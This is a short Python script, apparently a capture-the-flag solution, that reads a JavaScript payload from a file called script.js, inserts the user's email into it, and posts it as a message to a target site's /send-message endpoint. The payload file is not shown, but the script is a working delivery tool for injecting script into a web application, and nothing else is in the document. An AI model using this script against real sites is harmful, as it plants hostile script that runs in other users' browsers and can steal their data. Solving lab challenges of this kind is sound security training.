import requests
import sys
import re
if len(sys.argv) != 3:
	print('Usage: solution.py <challenge-url> <email>')

# Variables 
url = sys.argv[1]
email = sys.argv[2]

# Prep the payload
f = open('script.js','r')
payload = f.read()
f.close()
payload = payload.replace('your-email',email)

# Send the payload
param= {'email': email,'message':payload}
requests.post(url + '/send-message', data=param)
